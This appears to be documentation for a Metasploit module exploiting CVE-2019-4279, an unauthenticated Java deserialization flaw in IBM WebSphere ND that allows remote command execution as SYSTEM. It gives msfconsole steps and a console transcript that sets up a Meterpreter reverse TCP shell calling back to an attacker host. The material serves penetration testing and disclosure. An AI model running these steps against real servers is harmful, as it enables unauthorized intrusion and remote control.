## Description
This module exploits the lack of proper authentication checks in IBM Websphere Application Server ND that allows for the execution of an arbitrary command and upload of an arbitrary file as SYSTEM. The module serializes the required Java objects expected by the IBM Websphere server.

The vulnerability was identified by @rwincey (b0yd) of [Securifera](https://www.securifera.com/) and was assigned [CVE-2019-4279](https://www-01.ibm.com/support/docview.wss?uid=ibm10883628).


## Vulnerable Application
The module affects [IBM Websphere Application Server Network Deployment](https://www.ibm.com/support/knowledgecenter/en/SSAW57/mapfiles/product_welcome_wasnd.html). The agent is installed on servers with the network deployment feature and listens on TCP port 11002,11004, or 11006. The vulnerability affects versions up to 9.0.0.11.

## Verification Steps
To use this exploit you will need access to IBM Websphere Application Server Network Deployment.

1. Install the IBM Websphere Application Server Network Deployment on a host.
2. Ensure that the service is running and listening on TCP port 11002, 11004, or 11006.
3. Launch `msfconsole`.
4. Load the module `use exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce`.
5. Set the remote host ip to execute `set RHOSTS 192.168.162.133`.
6. Set the command to execute `set CMD "calc.exe"`.
7. Run the exploit `exploit`.

The result should be that calc.exe is executed on the target machine.

## Usage Scenarios
The exploit module contains several targets as detailed below.

### Target 0: Windows Powershell Injected Shellcode
This module target provides support for command staging to enable arbitrary Metasploit payloads to be used against Windows targets (for example, a Meterpreter shell). 

	msf5 > use exploit/windows/ibm/ibm_was_dmgr_java_deserialization_rce
	msf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) > set RHOSTS 192.168.162.133
	RHOSTS => 192.168.162.133
	msf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) > set LHOST 192.168.162.128
	LHOST => 192.168.162.128
	msf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) > set payload windows/meterpreter/reverse_tcp
	payload => windows/meterpreter/reverse_tcp
	msf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) > exploit -j
	[*] Exploit running as background job 0.
	msf5 exploit(windows/ibm/ibm_was_dmgr_java_deserialization_rce) > 
	[*] Started reverse TCP handler on 192.168.162.128:4444

	[*] 192.168.162.133:11006 - Server responded
	[*] 192.168.162.133:11006 - Sending payload: A98f3f3.exe
	[*] Sending stage (179779 bytes) to 192.168.162.133

### Target 1: Generic Command Callback
This target isn't a formal target. It was added to allow a user to execute commands entirely through the IBM Websphere Application Network Deployment Server remote administration feature. It would be the most quiet of the targets as it does not create any additional connections or use powershell by default like Target 0.
